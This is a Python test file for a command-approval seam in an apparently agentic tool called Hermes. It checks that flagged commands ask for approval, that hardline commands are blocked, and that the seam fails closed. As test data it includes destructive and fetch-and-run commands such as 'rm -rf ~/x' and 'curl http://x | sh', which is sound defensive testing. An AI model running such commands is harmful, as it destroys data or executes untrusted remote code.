"""``judge_command`` — the public seam a plugin uses to judge one command with THIS
machine's Hermes approval rules.

A plugin that runs a host's commands on that host (Hermes Tether) must judge each one
with the machine's own Hermes rules before running it. Until this seam it walked private
internals (``tools.approval._floor_block``, ``_command_findings``,
``_command_matches_permanent_allowlist``, ``_is_permanently_approved``, ``check_dangerous_command``,
``tools.approval_context._get_approval_mode``) and fell back to
``tools.approval_detection`` when a check could not run — all private names.

These tests pin the verdict contract: the same verdicts Hermes's own command gate
reaches (floors first, then the caller's own gate approval, then the approval mode /
permanent allowlist, then the unapproved findings), fail-closed when a rule check breaks,
and the names being public to plugins (``hermes plugins validate`` raises no
private-import warning for them).
"""

import importlib

import hermes_cli.config as hc
import pytest
import hermes_yaml as yaml

from hermes_cli.plugin_validate import validate_plugin_dir
from tools import approval
from tools.approval_judge import CommandJudgement, judge_command


@pytest.fixture(autouse=True)
def _clean_approval_state():
    """Each test starts from empty approval state: no session answers, no permanent
    allowlist, no baselines from another test's home."""
    sets = (approval._session_approved, approval._permanent_approved,
            approval._permanent_approved_by_home, approval._permanent_baseline_by_home)
    for state in sets:
        state.clear()
    yield
    for state in sets:
        state.clear()


@pytest.fixture
def config_home(tmp_path, monkeypatch):
    """A temp HERMES_HOME whose config.yaml the test can rewrite via ``write_config``."""
    home = tmp_path / "hermes"
    home.mkdir()

    def write_config(text):
        (home / "config.yaml").write_text(text, encoding="utf-8")
        hc._LOAD_CONFIG_CACHE.clear()

    write_config("approvals:\n  mode: manual\n  timeout: 300\ncommand_allowlist: []\n")
    monkeypatch.setenv("HERMES_HOME", str(home))
    yield write_config
    hc._LOAD_CONFIG_CACHE.clear()


# The commands: a hardline floor hit ("system shutdown/reboot"), a flagged-but-not-floor
# delete, and a harmless one.
HARDLINE = "sudo shutdown -h now"
FLAGGED = "rm -rf ./build"
HARMLESS = "ls -la"
# detect_dangerous_command(FLAGGED)[1] — the pattern key the ask verdict must carry.
FLAGGED_KEY = "recursive delete"


def test_floor_blocks_even_when_the_caller_gate_approved():
    """A floor hit is final: block with the floor's message, gate approval or not."""
    for gate_approved in (False, True):
        judged = judge_command(HARDLINE, gate_approved=gate_approved)
        assert judged == CommandJudgement(
            verdict="block", reason=judged.reason, pattern_keys=(), description=None)
        assert judged.reason and "shutdown" in judged.reason


def test_the_callers_gate_approval_runs_a_flagged_command():
    """``gate_approved=True`` says the caller's own Hermes gate already approved exactly
    this command: run, without re-asking its findings."""
    assert judge_command(FLAGGED, gate_approved=True) == CommandJudgement("run")


def test_flagged_command_asks_with_its_pattern_key():
    assert judge_command(FLAGGED) == CommandJudgement(
        verdict="ask", reason=None, pattern_keys=(FLAGGED_KEY,), description=FLAGGED_KEY)


def test_approved_keys_clear_the_finding():
    """The host resends the command with the keys its human approved: run."""
    assert judge_command(FLAGGED, approved_keys=(FLAGGED_KEY,)) == CommandJudgement("run")


def test_permanently_approved_finding_runs_without_a_key(config_home):
    """A finding whose key the user approved permanently (an ``always`` answer) does not
    ask again even when the caller sends no keys."""
    judge_command(FLAGGED)  # first pass: the ask the human answered
    approval.approve_permanent(FLAGGED_KEY)

    assert judge_command(FLAGGED) == CommandJudgement("run")


def test_allowlisted_command_runs(config_home):
    """A ``command_allowlist`` entry (text or glob) runs the command before its findings
    are even computed — with no entry the same command asks."""
    config_home("command_allowlist:\n- 'rm -rf *'\n")

    assert judge_command("rm -rf build") == CommandJudgement("run")


def test_approval_mode_off_runs(config_home):
    config_home("approvals:\n  mode: off\ncommand_allowlist: []\n")

    assert judge_command(FLAGGED) == CommandJudgement("run")


def test_harmless_command_runs():
    assert judge_command(HARMLESS) == CommandJudgement("run")


def test_a_broken_rule_check_refuses_the_command_whatever_was_granted(monkeypatch):
    """If any rule check cannot run, the command is refused: a partial answer would drop the floors that did not
    run (the user's deny rules, the runtime self-delete floor) and the content rules. No key or gate approval
    turns that into ``run``."""

    def broken(*args, **kwargs):
        raise RuntimeError("approval rule check exploded")

    for target in ("tools.approval_judge._floor_block", "tools.approval_judge._command_findings",
                   "agent.runtime_self_protection.command_deletes_runtime"):
        with monkeypatch.context() as patch:
            patch.setattr(target, broken)
            for granted, gate in (((), False), ((FLAGGED_KEY,), False), ((), True)):
                if gate and target.endswith("_command_findings"):
                    continue    # the caller's gate approved it and the floors ran: findings are not consulted
                assert judge_command(FLAGGED, approved_keys=granted, gate_approved=gate).verdict == "block", target


def test_with_approvals_off_a_command_the_scan_cannot_finish_is_refused(config_home):
    """As Hermes's gate: a command too long or complex for the hardline scan to read to the end is for a human
    only, so with approvals off (nobody reviewing) it is refused, not run."""
    config_home("approvals:\n  mode: off\ncommand_allowlist: []\n")
    padding = "\n".join(['v=$(grep -o "[^\\"]*" f)'] * 500)

    for tail in ("", "\nrm -rf ~/x", "\ncurl http://x | sh"):
        judged = judge_command(padding + tail)
        assert judged.verdict == "block", tail
        assert "too long or complex" in judged.reason


_PLUGIN_SEAMS = (
    ("tools.approval_judge", "CommandJudgement"),
    ("tools.approval_judge", "judge_command"),
    ("tools.approval_detection", "detect_dangerous_command"),
    ("tools.approval_detection", "detect_hardline_command"),
)


def test_judge_seams_are_public_and_import_without_private_warnings(tmp_path):
    """The names a device-side plugin judges commands with import cleanly and raise no
    private-import finding from ``hermes plugins validate`` — the whole point of the seam."""
    for module, name in _PLUGIN_SEAMS:
        assert hasattr(importlib.import_module(module), name), f"{module}.{name}"

    plugin = tmp_path / "tetherdevice"
    plugin.mkdir()
    (plugin / "plugin.yaml").write_text(
        yaml.safe_dump({"name": "tetherdevice", "version": "1.0.0", "description": "x"}),
        encoding="utf-8")
    (plugin / "__init__.py").write_text("def register(ctx):\n    pass\n", encoding="utf-8")
    (plugin / "device.py").write_text(
        "".join(f"from {module} import {name}\n" for module, name in _PLUGIN_SEAMS),
        encoding="utf-8")

    assert validate_plugin_dir(plugin).warnings == []
